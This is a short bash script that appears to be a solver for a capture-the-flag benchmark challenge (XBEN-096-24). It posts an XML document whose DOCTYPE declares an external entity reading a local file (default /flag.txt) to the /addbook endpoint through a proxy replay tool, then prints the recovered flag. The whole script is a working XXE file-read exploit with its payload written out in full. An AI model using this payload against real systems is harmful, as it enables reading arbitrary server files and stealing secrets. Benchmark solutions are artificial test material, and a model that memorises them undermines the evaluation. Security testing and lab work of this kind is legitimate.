#!/usr/bin/env bash
# XBEN-096-24 — XXE file read. Proxy-mode twin. /addbook parses the posted XML
# with external entities enabled, so an entity pointing at /flag.txt embeds the
# flag in the parsed result.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/flag.txt}"
SESSION="xben096p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/addbook' \
  --set "form.xml=<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$FILE\">]><r>&x;</r>" >/dev/null
print_flag
